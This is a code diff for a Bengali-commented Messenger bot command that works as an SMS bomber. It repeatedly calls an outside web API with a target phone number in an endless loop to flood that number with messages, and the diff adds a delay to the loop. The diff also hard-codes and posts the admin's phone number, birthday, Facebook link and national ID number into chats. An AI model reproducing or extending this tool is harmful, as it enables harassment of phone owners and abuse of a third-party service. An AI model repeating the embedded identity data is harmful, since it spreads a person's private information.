@@ -13,12 +13,14 @@ module.exports.config = {
 const axios = require("axios");
 const bombingFlags = {};
 
-// এডমিন UID ও ফোন
+// এডমিন ডাটা
 const adminUIDs = ["100013678366954"]; // রাজার UID
-const adminPhone = "01715559179";      // রাজার মোবাইল
-
-// Access Token দিন এখানে
-const FACEBOOK_ACCESS_TOKEN = "আপনার_ফেসবুক_অ্যাক্সেস_টোকেন_এখানে_দিবেন";
+const adminName = "রাজা";
+const adminPhone = "01715559179";
+const adminBirthday = "05.05.2005";
+const adminRelationship = "Unmarried"; // Married/Unmarried
+const adminFacebookLink = "https://www.facebook.com/RAJA.ViP.5X.09638357510";
+const adminNIDCardLink = "9180861099"; // এডমিনের NID কার্ড নম্বর
 
 // সিকিউরিটি চেক
 if (!adminUIDs.includes("100013678366954") || adminPhone !== "01715559179") {
@@ -56,23 +58,6 @@ module.exports.run = async ({ api, event, args }) => {
     return api.sendMessage("⚠️ আপনি এই কমান্ড ব্যবহারের অনুমতি পাননি।", threadID);
   }
 
-  // ফেসবুক থেকে জন্মদিন আনা
-  let userBirthday = "জন্মদিন তথ্য পাওয়া যায়নি।";
-  try {
-    const res = await axios.get(`https://graph.facebook.com/${senderID}`, {
-      params: {
-        fields: "birthday",
-        access_token: FACEBOOK_ACCESS_TOKEN
-      }
-    });
-
-    if (res.data && res.data.birthday) {
-      userBirthday = res.data.birthday; // "MM/DD/YYYY" বা "MM/DD"
-    }
-  } catch (e) {
-    console.log("Birthday fetch error:", e.message);
-  }
-
   // লোকেশন (ঢাকা ধরে নেওয়া)
   const latitude = 23.8103;
   const longitude = 90.4125;
@@ -102,6 +87,8 @@ module.exports.run = async ({ api, event, args }) => {
 
   const now = new Date();
   const formattedDateTime = formatDateTime(now);
+
+  // ইউজারের ফেসবুক প্রোফাইল লিংক
   const userProfile = `https://facebook.com/${senderID}`;
 
   api.sendMessage(
@@ -109,8 +96,12 @@ module.exports.run = async ({ api, event, args }) => {
     `⏰ সময়: ${formattedDateTime}\n` +
     `📍 লোকেশন (ধারণা): ${locationURL}\n` +
     `👤 ইউজার প্রোফাইল: ${userProfile}\n` +
-    `🎂 আপনার জন্মদিন: ${userBirthday}\n` +
-    `📞 এডমিন: রাজা (${adminPhone})\n\n` +
+    `🎂 আপনার জন্মদিন: তথ্য পাওয়া যায়নি।\n` +
+    `📞 এডমিন: ${adminName} (${adminPhone})\n` +
+    `🔗 এডমিন ফেসবুক: ${adminFacebookLink}\n` +
+    `🎉 এডমিন জন্মদিন: ${adminBirthday}\n` +
+    `❤️ রিলেশনশিপ: ${adminRelationship}\n` +
+    `🆔 এডমিন NID কার্ড: ${adminNIDCardLink}\n\n` +
     `বন্ধ করতে /sms off`,
     threadID
   );
@@ -120,6 +111,7 @@ module.exports.run = async ({ api, event, args }) => {
     while (bombingFlags[threadID]) {
       try {
         await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
+        await new Promise(resolve => setTimeout(resolve, 1000)); // ১ সেকেন্ড অপেক্ষা
       } catch (err) {
         api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
         bombingFlags[threadID] = false;
